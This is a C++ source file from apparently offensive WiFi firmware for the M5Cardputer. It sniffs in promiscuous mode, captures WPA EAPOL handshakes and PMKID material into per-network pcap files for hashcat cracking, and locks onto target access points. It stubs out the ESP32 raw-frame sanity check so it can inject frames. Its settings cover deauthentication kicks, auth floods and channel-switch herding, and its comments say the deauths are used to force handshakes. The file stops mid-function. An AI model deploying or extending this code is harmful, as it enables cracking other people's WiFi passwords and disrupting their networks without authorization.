// cap/sniffer.cpp
// Promiscuous EAPOL capture -> one classic pcap per BSSID.

#include "sniffer.h"
#include "pcap.h"
#include "hc22000.h"
#include "capture_name.h"
#include "methods/method_ctx.h"
#include "../storage/littlefs_ops.h"
#include "../net/ap_sta.h"
#include "../core/config.h"
#include "../core/xp.h"
#include "../core/wsl_bypasser.h"
#include "../ui/display.h"
#include <M5Cardputer.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <freertos/portmacro.h>  // portENTER_CRITICAL for s_pendingLearn race
#include <WiFi.h>
#include <SD.h>
#include <string.h>
#include <stdio.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

static const uint16_t FRAME_MAX = 512;
static const uint8_t  RING_SLOTS = 12;
static const uint32_t MAX_FILE_SIZE = 50UL * 1024UL * 1024UL; // 50 MB per pcap
static const uint16_t MAX_FILES = 200;
static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_CORE[] = {1, 6, 11};

struct Slot {
    uint8_t  bssid[6];
    uint8_t  station[6];
    uint16_t len;
    uint32_t ts;
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  frame[FRAME_MAX];
};

static Slot s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read  = 0;

static File     s_file;
static uint8_t  s_fileBssid[6];
static uint8_t  s_lastHsBssid[6];
static bool     s_fileOpen = false;
static uint32_t s_fileSize = 0;
static char     s_fileName[Storage::FILE_NAME_MAX];
// One-shot log dedup for the "file is already at MAX_FILE_SIZE" branch
// in openFileForBssid() — without this, the Serial would see one
// "[CAP] full" line per EAPOL frame, drowning out useful output. Reset
// to all-zero every time we successfully open a fresh file.
static uint8_t  s_fullLoggedBssid[6] = {};
static const char* const PREFIX = "/0N3P0rK/handshakes/";

// A beacon captured while a network is still hidden has an empty SSID, so the
// pcap gets created as HIDDEN_<bssid>.pcap and — worse — Hc22000::convertPcap()
// can never derive a crackable hash from it later (WPA-PSK needs the real
// ESSID). When the real name shows up on a later beacon/probe response for a
// BSSID we already have a HIDDEN file for, we rename the file and splice the
// revealing frame in. The actual SD I/O happens in drainRing() (loop context),
// never here — storeBeacon() runs from the WiFi promiscuous callback and must
// stay allocation/I/O free.
static uint8_t  s_pendingLearnBssid[6] = {};
static bool     s_pendingLearn = false;
// Guards s_pendingLearn / s_pendingLearnBssid: written by storeBeacon()
// from the WiFi promiscuous callback (IRAM, can preempt the loop task
// at any moment) and read+cleared by processPendingSsidLearn() in loop().
// The two fields are a logical pair - reading them across the boundary
// without a critical section could let the callback overwrite BSSID with
// a fresh entry right after the loop side reset the flag.
static portMUX_TYPE s_pendingMux = portMUX_INITIALIZER_UNLOCKED;

static const uint8_t BEACON_SLOTS = 16;
// BeaconSlot itself now lives in methods/beacon_slot.h (pulled in via
// method_ctx.h) so the capture methods can read it without depending on
// sniffer.cpp's internals.
static BeaconSlot s_beacons[BEACON_SLOTS];
static uint8_t s_beaconCount = 0;
static uint8_t s_beaconClock = 0;

static Counters s_cnt = {};
static volatile bool s_running = false;
static RunMode  s_mode = RunMode::Off;
static bool     s_hopEnabled = false;
static bool     s_deauthEnabled = false;
static uint8_t  s_channelIdx = 0;
static uint32_t s_lastHopMs = 0;
static uint8_t  s_apMac[6] = {};
static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t  s_kickSta[6] = {};
static uint8_t  s_kickBssid[6] = {};
static bool     s_kickStaOk = false;
static uint32_t s_lockUntil = 0;
static bool     s_lockOnHs = true;
static uint16_t s_lockMs = 8000;
static uint16_t s_hopMs = 300;
static int8_t   s_minRssi = -85;
static uint8_t  s_hopSet = 0;
static uint8_t  s_hsMethod = 0;
static uint8_t  s_activeMethod = 0; // 0=OURS 1=PAN
static uint8_t  s_fallbackSec = 25;
static uint8_t  s_kickBurst = 2;
static bool     s_bidirKick = true;
static bool     s_eapolTx = true;
static bool     s_pmkidProbe = true;
static bool     s_csaHerd = false;
static bool     s_authFlood = false;
static uint8_t  s_deauthReason = 7;
static bool     s_fatPcap = true;
// Porkchop-style knobs. All start at 0 (= "off / use legacy behavior")
// so existing installs behave exactly as before until the user opts in
// from the RADIO menu.
static uint8_t  s_jitterMs = 0;       // 0..20 random ms between mgmt frames
static uint8_t  s_cooldownSec = 0;    // 0..30 seconds per-AP cooldown after kick
static int16_t  s_scoreThr = 0;        // -100..200, PORKCHOP method min score
static uint16_t s_dwellMinMs = 120;    // 50..600 minimum channel dwell
static uint8_t  s_hsDepth = 0;         // 0=PAIR(M1+M2) 1=+M3 2=FULL(M1-M4)
static bool     s_dataAct = false;     // count data frames for FOCUS activity
static bool     s_strictLock = true;   // FOCUS ignores score while lock-on-BSSID
static uint8_t  s_depthHoldSec = 0;    // extra sec hold after pair when hsDepth>0
static uint32_t s_methodStartMs = 0;
static uint16_t s_pairAtSwitch = 0;
static bool     s_pinOk = false;
static uint8_t  s_pinBssid[6] = {};
static uint8_t  s_pinCh = 6;
static char     s_pinSsid[33] = {};

// ---- Lock-on-BSSID (Porkchop-style) -----------------------------------
// When the first EAPOL M1 is seen for a target BSSID we want M2 (or M3/M4)
// from the same handshake. M2 is sent by the STATION back to the AP, on the
// same channel the AP is on — which may not be the channel we're currently
// hopping through. Standard lock-on-channel (s_lockUntil) blocks hopping but
// can still hop AWAY if the radio's channel happens to switch. Lock-on-BSSID
// instead parks us on the target BSSID's known channel until either M2 is
// seen, hasPair() goes true, or lockMs elapses. Drop-in: s_lockUntil still
// works, but lock-on-BSSID wins while it's armed.
static uint8_t  s_lockBssid[6] = {};      // BSSID we are parked on (zeroed when idle)
static uint8_t  s_lockBssidCh = 0;        // channel that BSSID was last seen on
static uint32_t s_lockBssidUntil = 0;     // millis() deadline; 0 = not armed
// When the CURRENT continuous streak of locking onto s_lockBssid began -
// set once when the streak starts, deliberately NOT refreshed on every
// repeat EAPOL/M1. Backs the hard cap below.
static uint32_t s_lockBssidArmedMs = 0;

// Session-only skip list: Z drops a stuck target until Cap::stop()/start.
static const uint8_t SKIP_MAX = 16;
static uint8_t s_skipList[SKIP_MAX][6];
static uint8_t s_skipN = 0;
static bool    s_skipKeyWas = false;

// True MAC empty check — first-byte-only was wrong for BSSIDs like 00:11:22:…
static bool isZeroMac(const uint8_t* m) {
    if (!m) return true;
    for (uint8_t i = 0; i < 6; i++) {
        if (m[i] != 0) return false;
    }
    return true;
}

static bool isSessionSkipped(const uint8_t* bssid) {
    if (isZeroMac(bssid)) return false;
    for (uint8_t i = 0; i < s_skipN; i++) {
        if (memcmp(s_skipList[i], bssid, 6) == 0) return true;
    }
    return false;
}

static void clearSkipList() {
    s_skipN = 0;
    memset(s_skipList, 0, sizeof(s_skipList));
}

static bool addSkip(const uint8_t* bssid) {
    if (isZeroMac(bssid)) return false;
    if (isSessionSkipped(bssid)) return true;
    if (s_skipN >= SKIP_MAX) {
        // Drop oldest so we never lose the newest skip the user just pressed.
        memmove(s_skipList[0], s_skipList[1], (SKIP_MAX - 1) * 6);
        s_skipN = SKIP_MAX - 1;
    }
    memcpy(s_skipList[s_skipN++], bssid, 6);
    return true;
}

// Parse "AA:BB:CC:DD:EE:FF" from counters.currentBssid into out[6].
static bool parseColonMac(const char* s, uint8_t out[6]) {
    if (!s || !s[0]) return false;
    unsigned v[6];
    if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return false;
    for (uint8_t i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
    return !isZeroMac(out);
}

// Hard ceiling on how long we'll sit locked on one target. Without this,
// an AP whose client never completes the handshake (often *because* we're
// actively deauthing it mid-handshake) just keeps retransmitting M1 every
// second or two forever - and since every M1 refreshes s_lockUntil AND
// s_lockBssidUntil, the lock would otherwise never expire on its own,
// permanently pinning the radio on one BSSID/channel ("stops on one
// client and doesn't move on"). This forces a release after a few
// multiples of the user's LOCK MS setting no matter how often M1 repeats.
static uint32_t lockHardCapMs() {
    uint32_t cap = (uint32_t)s_lockMs * 4;
    if (cap < 15000) cap = 15000;
    if (cap > 60000) cap = 60000;
    return cap;
}

static bool lockStreakExpired() {
    return s_lockBssidArmedMs != 0 && (millis() - s_lockBssidArmedMs) >= lockHardCapMs();
}

static const uint8_t* hopTable(uint8_t* count) {
    if (s_hopSet == (uint8_t)HopSet::CORE) {
        *count = sizeof(HOP_CORE);
        return HOP_CORE;
    }
    *count = sizeof(HOP_ALL);
    return HOP_ALL;
}

// RSN IE layout: version(2) group(4) pairCnt(2) pair*4 akmCnt(2) akm*4 caps(2) ...
// bit6 of caps = MFPC (station/AP supports 802.11w), bit7 = MFPR (required).
// Either bit set means unauthenticated deauth/disassoc will be dropped by the AP/STA.
static bool parseRsnMfpc(const uint8_t* ie, uint8_t ielen) {
    if (ielen < 20) return false;
    uint16_t off = 2 + 4;
    if (off + 2 > ielen) return false;
    uint16_t pairCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    off = (uint16_t)(off + 2 + pairCnt * 4);
    if (off + 2 > ielen) return false;
    uint16_t akmCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    off = (uint16_t)(off + 2 + akmCnt * 4);
    if (off + 2 > ielen) return false;
    uint16_t caps = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    return (caps & 0x00C0) != 0; // MFPC or MFPR
}

static bool beaconHasPmf(const uint8_t* f, uint16_t len) {
    uint16_t off = 24 + 12; // fixed beacon params
    while (off + 2 <= len) {
        uint8_t id = f[off];
        uint8_t l = f[off + 1];
        if (off + 2 + l > len) break;
        if (id == 48 && parseRsnMfpc(f + off + 2, l)) return true;
        off = (uint16_t)(off + 2 + l);
    }
    return false;
}

static BeaconSlot* findBeacon(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
    }
    return nullptr;
}

// Method dispatch reads from Methods::table() (see methods/method_ctx.h).
// Adding a capture method = adding a row to METHOD_LIST() in method_ctx.h;
// the compiler rebuilds the table, this file doesn't need a thing.
//
// s_activeMethod is the index into that table; 0 is the default. The AUTO
// mode rotates through [1..count) after a fallback timeout, see
// maybeRotateMethod().

static uint8_t s_methodCount = 0;

static const Methods::Entry* methodTable() {
    return Methods::table(&s_methodCount);
}

static void setMethodTag() {
    const Methods::Entry* tbl = methodTable();
    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
    const char* n = tbl[idx].name;
    strncpy(s_cnt.methodTag, n, sizeof(s_cnt.methodTag) - 1);
    s_cnt.methodTag[sizeof(s_cnt.methodTag) - 1] = '\0';
}

static void noteClient(const uint8_t* bssid, const uint8_t* sta) {
    if (!bssid || !sta) return;
    if (sta[0] & 0x01) return;
    BeaconSlot* b = findBeacon(bssid);
    if (!b) return;
    // Linear-scan dedup against the live client count, not the hard cap.
    // Cheap (20 * memcmp(6B) worst case) and correct even after rollover.
    uint8_t cap = (uint8_t)(sizeof(b->clients) / sizeof(b->clients[0]));
    for (uint8_t i = 0; i < b->clientN; i++) {
        if (memcmp(b->clients[i], sta, 6) == 0) return;
    }
    if (b->clientN < cap) {
        memcpy(b->clients[b->clientN], sta, 6);
        b->clientN++;
        return;
    }
    // Pool full - LRU-ish eviction by clock counter so we don't churn the
    // same four slots forever in a busy room.
    memcpy(b->clients[s_beaconClock % cap], sta, 6);
}

static bool hopLocked() {
    return s_lockUntil != 0 && millis() < s_lockUntil;
}

// Returns true while we are parked on a target BSSID's channel waiting for
// the rest of its 4-way handshake (M2/M3/M4). Callers should treat this as
// 'do not hop away'.
static bool bssidLocked() {
    if (isZeroMac(s_lockBssid) || s_lockBssidUntil == 0) return false;
    if (lockStreakExpired()) return false;
    return millis() < s_lockBssidUntil;
}

// Arm lock-on-BSSID. Called from the promiscuous callback the first time an
// EAPOL M1 (or any EAPOL at all) is seen for `bssid`. We remember the
// BSSID, the channel we saw it on, and a deadline of `lockMs` from now. If
// we're already armed for the same BSSID, refresh the deadline only — no
// spurious channel jumps.
static void armLockOnBssid(const uint8_t* bssid, uint8_t channel) {
    if (isZeroMac(bssid)) return;
    if (isSessionSkipped(bssid)) return;
    if (s_lockOnHs && s_lockMs > 0) {
        bool same = (memcmp(s_lockBssid, bssid, 6) == 0);
        if (!same) {
            memcpy(s_lockBssid, bssid, 6);
            s_lockBssidArmedMs = millis(); // new streak - starts the hard-cap clock
        }
        if (channel >= 1 && channel <= 13) s_lockBssidCh = channel;
        s_lockBssidUntil = millis() + s_lockMs;
    }
}

// Disarm lock-on-BSSID once a complete pair is on file (or after timeout).
// Clearing the BSSID bytes to zero is what bssidLocked() looks at, so this
// is the single off-switch.
static void disarmLockOnBssid() {
    memset(s_lockBssid, 0, 6);
    s_lockBssidCh = 0;
    s_lockBssidUntil = 0;
    s_lockBssidArmedMs = 0;
}

static void noteNetwork(const uint8_t* bssid, const char* ssid, bool force) {
    if (!bssid) return;
    if (s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0) return;
    // Session skip (Z): stop showing / chasing this BSSID in the bar.
    if (isSessionSkipped(bssid)) return;
    // current* tracks last-seen beacon / activity for Z-skip resolution.
    // The bottom-bar LEFT label uses target* (setBarTarget) so hopping
    // beacons no longer flicker random SSIDs over the real focus.
    snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);
    if (ssid && ssid[0]) {
        strncpy(s_cnt.currentSsid, ssid, sizeof(s_cnt.currentSsid) - 1);
        s_cnt.currentSsid[sizeof(s_cnt.currentSsid) - 1] = '\0';
    } else if (force) {
        s_cnt.currentSsid[0] = '\0';
    }
}

static void ssidForBssid(const uint8_t* bssid, char out[33]) {
    out[0] = '\0';
    const BeaconSlot* bcn = findBeacon(bssid);
    if (bcn && bcn->ssid[0]) {
        strncpy(out, bcn->ssid, 32);
        out[32] = '\0';
        return;
    }
    if (bcn) CapName::ssidFromMgmt(bcn->frame, bcn->len, out);
}

// Bottom-bar focus: 0=SCAN 1=LOCK 2=HS 3=PIN 4=KICK
static void setBarTarget(uint8_t mode, const uint8_t* bssid, const char* ssidHint) {
    s_cnt.targetMode = mode;
    if (isZeroMac(bssid)) {
        s_cnt.targetBssid[0] = '\0';
        s_cnt.targetSsid[0] = '\0';
        return;
    }
    snprintf(s_cnt.targetBssid, sizeof(s_cnt.targetBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);
    if (ssidHint && ssidHint[0]) {
        strncpy(s_cnt.targetSsid, ssidHint, sizeof(s_cnt.targetSsid) - 1);
        s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
    } else {
        char ssid[33];
        ssidForBssid(bssid, ssid);
        if (ssid[0]) {
            strncpy(s_cnt.targetSsid, ssid, sizeof(s_cnt.targetSsid) - 1);
            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
        } else if (mode == 3 && s_pinSsid[0]) {
            strncpy(s_cnt.targetSsid, s_pinSsid, sizeof(s_cnt.targetSsid) - 1);
            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
        } else {
            // Name unknown — never show MAC (confusing). Placeholder only.
            strncpy(s_cnt.targetSsid, "?", sizeof(s_cnt.targetSsid) - 1);
            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
        }
    }
}

static void clearBarTarget() {
    s_cnt.targetMode = 0;
    s_cnt.targetSsid[0] = '\0';
    s_cnt.targetBssid[0] = '\0';
}

static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
    if (!bssid || !f || len < 24) return;
    if (len > BEACON_MAX) len = BEACON_MAX;
    char ssid[33];
    CapName::ssidFromMgmt(f, len, ssid);
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
            memcpy(s_beacons[i].frame, f, len);
            s_beacons[i].len = len;
            s_beacons[i].channel = s_cnt.currentChannel;
            s_beacons[i].rssi = rssi;
            s_beacons[i].pmfCapable = beaconHasPmf(f, len);
            bool learned = ssid[0] && !s_beacons[i].ssid[0];
            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
            if (learned) {
                Hc22000::feed(f, len);
                // Runs from the WiFi promiscuous callback (IRAM). The
                // consumer (processPendingSsidLearn in loop) reads both
                // s_pendingLearn and s_pendingLearnBssid as a pair, so
                // protect the write with a critical section - otherwise
                // the loop side can reset the flag, get preempted here,
                // and then memcpy overwrites the BSSID with a new one
                // before the loop reads it. The whole region is two
                // small writes, blocking IRQs for microseconds.
                portENTER_CRITICAL(&s_pendingMux);
                memcpy(s_pendingLearnBssid, bssid, 6);
                s_pendingLearn = true;
                portEXIT_CRITICAL(&s_pendingMux);
            }
            if (ssid[0] && memcmp(bssid, s_lastHsBssid, 6) == 0) {
                strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
                s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
                noteNetwork(bssid, ssid, true);
            } else if (!hopLocked()) {
                noteNetwork(bssid, s_beacons[i].ssid, false);
            }
            return;
        }
    }
    uint8_t idx;
    if (s_beaconCount < BEACON_SLOTS) {
        idx = s_beaconCount++;
    } else {
        idx = s_beaconClock++ % BEACON_SLOTS;
    }
    memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
    memcpy(s_beacons[idx].bssid, bssid, 6);
    memcpy(s_beacons[idx].frame, f, len);
    s_beacons[idx].len = len;
    s_beacons[idx].channel = s_cnt.currentChannel;
    s_beacons[idx].rssi = rssi;
    s_beacons[idx].pmfCapable = beaconHasPmf(f, len);
    if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
    if (!hopLocked()) noteNetwork(bssid, s_beacons[idx].ssid, false);
    Hc22000::feed(f, len);
}

static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !s_running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;

    s_cnt.framesSeen++;
    const uint8_t* f = pkt->payload;

    if (type == WIFI_PKT_MGMT) {
        uint8_t fc = f[0] & 0xFC;
        if (fc == 0x80 || fc == 0x50) {
            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
        } else if (fc == 0x10) {
            Hc22000::feed(f, len);
        }
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if ((f[0] & 0x0C) != 0x08) return;

    uint8_t toDs = (f[1] & 0x01) != 0;
    uint8_t fromDs = (f[1] & 0x02) != 0;

    const uint8_t* bssid = nullptr;
    const uint8_t* station = nullptr;
    uint16_t bodyOff = 24;
    if (toDs && !fromDs) {
        bssid   = f + 4;
        station = f + 10;
    } else if (!toDs && fromDs) {
        bssid   = f + 10;
        station = f + 4;
    } else if (toDs && fromDs) {
        // WDS / 4-address — Porkchop still looks for EAPOL here.
        bssid   = f + 16;
        station = f + 10;
        bodyOff = 30;
    } else {
        bssid   = f + 16;
        station = f + 10;
    }

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    bool isQos = (subtype & 0x08) != 0;
    if (isQos) bodyOff += 2;
    if (isQos && (f[1] & 0x80)) bodyOff += 4;

    if (bssid && station) noteClient(bssid, station);

    bool eapol = false;
    if (bodyOff + 8 <= len &&
        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
        eapol = true;
    }
    if (!eapol) {
        uint16_t lim = len;
        for (uint16_t i = bodyOff; i + 1 < lim; i++) {
            if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
        }
    }
    // DATA ACT (RADIO): count non-EAPOL data toward BeaconSlot::dataRecent
    // so FOCUS can score real traffic instead of beacon-only activity.
    if (!eapol && s_dataAct && bssid) {
        BeaconSlot* bb = findBeacon(bssid);
        if (bb && bb->dataRecent < 0xFFFF) bb->dataRecent++;
    }
    if (!eapol) return;
    if (s_pinOk && bssid && memcmp(bssid, s_pinBssid, 6) != 0) return;

    s_cnt.framesEapol++;
    // Only arm/refresh the lock for a target we're still actually chasing.
    // "Chasing" now respects HS DEPTH (RADIO menu): at the default depth
    // (0) this is just hasPair() as before (M1+M2, already crackable). At
    // depth 1/2 we keep the lock/kick going past that point specifically
    // to pull in M3 and/or M4 too, instead of releasing the moment the
    // pair alone is ready.
    bool stillChasing = bssid && bssid[0] != 0 &&
                        !isSessionSkipped(bssid) &&
                        !Hc22000::hasHandshake(bssid, s_hsDepth);
    if (s_lockOnHs && s_lockMs > 0 && stillChasing) {
        s_lockUntil = millis() + s_lockMs;
    }
    // Porkchop-style: arm lock-on-BSSID so we don't hop away from this
    // AP's channel before M2 (and, per HS DEPTH, M3/M4) arrive.
    // Hc22000::hasHandshake() releases the lock early once that depth is
    // met; lockStreakExpired() is the hard backstop if it never is (e.g.
    // our own kicks keep interrupting the handshake, so it never
    // completes and M1 just keeps retransmitting forever).
    if (s_lockOnHs && s_lockMs > 0 && stillChasing) {
        armLockOnBssid(bssid, s_cnt.currentChannel);
    }

    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_cnt.framesDropped++;
        return;
    }
    Slot& s = s_ring[s_write];
    memcpy(s.bssid, bssid, 6);
    memcpy(s.station, station, 6);
    s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
    s.ts  = millis();
    s.rssi = (int8_t)pkt->rx_ctrl.rssi;
    s.channel = s_cnt.currentChannel;
    memcpy(s.frame, f, s.len);
    s_write = next;
    s_cnt.framesQueued++;
}

static void makeFilename(const uint8_t* bssid, char out[Storage::FILE_NAME_MAX]) {
    char ssid[33];
    ssidForBssid(bssid, ssid);
    char stem[40];
    CapName::buildStem(ssid, bssid, stem, sizeof(stem));
    snprintf(out, Storage::FILE_NAME_MAX, "%s.pcap", stem);
}

static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts, uint8_t ch, int8_t rssi) {
    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
    uint8_t rtLen = Pcap::buildRadiotap(rt, ch ? ch : s_cnt.currentChannel, rssi, s_fatPcap);
    Pcap::PacketHeader ph;
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = rtLen + flen;
    ph.origLen = ph.inclLen;
    size_t n = 0;
    n += s_file.write((uint8_t*)&ph, sizeof(ph));
    n += s_file.write(rt, rtLen);
    n += s_file.write(frame, flen);
    size_t expect = sizeof(ph) + rtLen + flen;
    if (n != expect) return false;
    s_fileSize += expect;
    return true;
}

static void closeFile() {
    if (s_fileOpen) {
        s_file.flush();
        s_file.close();
        s_fileOpen = false;
    }
}

static bool openFileForBssid(const uint8_t* bssid) {
    if (s_fileOpen) closeFile();

    Storage::Stats st = Storage::stats();
    char name[Storage::FILE_NAME_MAX];
    makeFilename(bssid, name);
    char path[80];
    snprintf(path, sizeof(path), "%s%s", PREFIX, name);

    bool exists = SD.exists(path);
    // Probe size BEFORE any write open. A file smaller than the 24-byte
    // pcap global header is a remnant of a cut-short header write - delete
    // and start clean. A file that already has a full header (+ maybe
    // packets) is just an EXISTING capture for this BSSID that we're about
    // to APPEND more frames to (M2/M3/M4 arriving later, a retry, etc.) -
    // opening in "a" mode below never truncates, so there is nothing to
    // protect against here. The one real failure mode (SD size() lying
    // and reporting smaller than a moment ago) is caught separately after
    // the real open, below - that's the correct, narrow place for it.
    // NOTE: this function used to `return false` here for any file with
    // an existing header, treating it as "already finished, don't touch."
    // That was the actual data-loss bug: writeFrameToFile() closes the
    // current file the instant a frame from a DIFFERENT BSSID interleaves
    // (very common - the ring buffer carries frames from many APs), so
    // M1 would get written, the file would close as soon as any other AP's
    // frame came through, and then M2/M3/M4 for the SAME BSSID arriving
    // later would hit this check, get refused, and be silently dropped -
    // captures got stuck at "header + first frame" forever. Appending is
    // exactly what should happen instead; there is no scenario here where
    // NOT appending protects anything.
    size_t preSize = 0;
    if (exists) {
        File probe = SD.open(path, "r");
        preSize = probe ? probe.size() : 0;
        if (probe) probe.close();
        if (preSize > 0 && preSize < sizeof(Pcap::FileHeader)) {
            Serial.printf("[CAP] removed corrupt %u-byte pcap: %s\n", (unsigned)preSize, name);
            SD.remove(path);
            exists = false;
            preSize = 0;
        }
    }
    if (!exists && st.handshakes >= MAX_FILES) {
        Serial.println("[CAP] handshake cap (200 files) reached");
        return false;
    }

    s_file = SD.open(path, "a");
    if (!s_file) return false;

    s_fileSize = s_file.size();
    // Safety: if the card reported a non-empty file above but open shows 0,
    // something is wrong with the FS handle - do not write, do not remove.
    if (preSize >= sizeof(Pcap::FileHeader) && s_fileSize < preSize) {
        Serial.printf("[CAP] size mismatch (pre=%u open=%u), refuse write: %s\n",
                      (unsigned)preSize, (unsigned)s_fileSize, name);
        s_file.close();
        return false;
    }
    bool createdNew = false;
    if (s_fileSize >= MAX_FILE_SIZE) {
        s_file.close();
        if (memcmp(s_fullLoggedBssid, bssid, 6) != 0) {
            Serial.printf("[CAP] pcap at cap (%u bytes), skipping %s\n",
                          (unsigned)s_fileSize, name);
            memcpy(s_fullLoggedBssid, bssid, 6);
        }
        return false;
    }
    if (memcmp(s_fullLoggedBssid, bssid, 6) != 0) {
        memset(s_fullLoggedBssid, 0, sizeof(s_fullLoggedBssid));
    }

    // Only brand-new empty files get a header. Never rewrite header onto
    // an existing stream (preSize already gated above).
    if (s_fileSize == 0 && preSize == 0) {
        Pcap::FileHeader fh;
        fh.magic        = 0xA1B2C3D4;
        fh.versionMajor = 2;
        fh.versionMinor = 4;
        fh.thiszone     = 0;
        fh.sigfigs      = 0;
        fh.snaplen      = 65535;
        fh.linktype     = 127;
        if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
            s_file.close();
            SD.remove(path);
            return false;
        }
        s_fileSize = sizeof(fh);
        s_cnt.filesOpened++;
        createdNew = true;
        XP::addXP(XPEvent::HANDSHAKE);
    }

    memcpy(s_fileBssid, bssid, 6);
    memcpy(s_fileName, name, sizeof(s_fileName));
    s_fileOpen = true;

    char ssid[33];
    ssidForBssid(bssid, ssid);
    if (ssid[0]) CapName::writeCompanionSsid(Storage::DIR_HS, name, ssid);

    const BeaconSlot* bcn = findBeacon(bssid);
    if (bcn && (createdNew || s_fileSize < 80)) {
        writePcapPacket(bcn->frame, bcn->len, millis(), bcn->channel, bcn->rssi);
        Hc22000::feed(bcn->frame, bcn->len);
    }
    return true;
}

static bool sameBssid(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static void writeFrameToFile(const Slot& s) {
    // Z-skip: ignore further EAPOL from this BSSID for the rest of the session
    // (no pcap append, no UI "current network", no re-kick tracking).
    if (isSessionSkipped(s.bssid)) {
        if (s_fileOpen && sameBssid(s_fileBssid, s.bssid)) closeFile();
        return;
    }
    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
        closeFile();
    }
    if (s_fileOpen && s_fileSize >= MAX_FILE_SIZE) {
        closeFile();
    }
    if (!s_fileOpen) {
        // openFileForBssid() can refuse for two reasons:
        //   - cap on the existing file (>= MAX_FILE_SIZE) - logged inside
        //   - too many pcaps on SD already (>= MAX_FILES) - logged inside
        // In both cases we silently used to drop the frame WITHOUT
        // bumping framesDropped, so the user couldn't tell from the
        // counters that EAPOLs were being lost. Charge it here.
        if (!openFileForBssid(s.bssid)) {
            s_cnt.framesDropped++;
            return;
        }
    }
    if (!writePcapPacket(s.frame, s.len, s.ts, s.channel, s.rssi)) {
        s_cnt.framesDropped++;
        closeFile();
        return;
    }
    s_cnt.framesWritten++;
    Hc22000::feed(s.frame, s.len);
    memcpy(s_kickBssid, s.bssid, 6);
    memcpy(s_kickSta, s.station, 6);
    s_kickStaOk = (s.station[0] & 0x01) == 0;
    char ssid[33];
    ssidForBssid(s.bssid, ssid);
    memcpy(s_lastHsBssid, s.bssid, 6);
    noteNetwork(s.bssid, ssid, true);
    // Live focus for the bar: lock if armed on this BSSID, else HS/EAPOL.
    if (bssidLocked() && memcmp(s_lockBssid, s.bssid, 6) == 0)
        setBarTarget(1, s.bssid, ssid[0] ? ssid : nullptr);
    else
        setBarTarget(2, s.bssid, ssid[0] ? ssid : nullptr);
    if (ssid[0]) {
        strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
        CapName::writeCompanionSsid(Storage::DIR_HS, s_fileName, ssid);
    }
}

// Runs from loop() context (via drainRing) — safe to do SD I/O here.
static void processPendingSsidLearn() {
    // Atomically claim the pending-learn entry. Taking the flag and
    // copying the BSSID under the same critical section guarantees we
    // hand back the BSSID that was paired with the flag we just cleared
    // — otherwise storeBeacon() (IRAM, can preempt us here) could
    // overwrite s_pendingLearnBssid with a new entry between our read
    // and copy, and we'd process the wrong BSSID.
    uint8_t bssid[6];
    portENTER_CRITICAL(&s_pendingMux);
    if (!s_pendingLearn) {
        portEXIT_CRITICAL(&s_pendingMux);
        return;
    }
